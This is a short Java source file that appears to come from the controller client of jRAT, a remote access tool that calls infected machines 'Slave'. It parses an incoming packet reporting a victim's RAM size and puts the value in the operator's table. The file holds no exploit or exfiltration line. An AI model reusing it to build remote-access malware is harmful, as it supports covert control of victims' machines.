package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;
import io.jrat.client.ui.frames.Frame;
import io.jrat.client.utils.Utils;

import java.io.DataInputStream;


public class Packet63InitRAM extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int ram = slave.readInt();
		slave.setRam(ram);

		int row = Utils.getRow(slave);

		Frame.mainModel.setValueAt(ram + " mb", row, 7);
	}

}
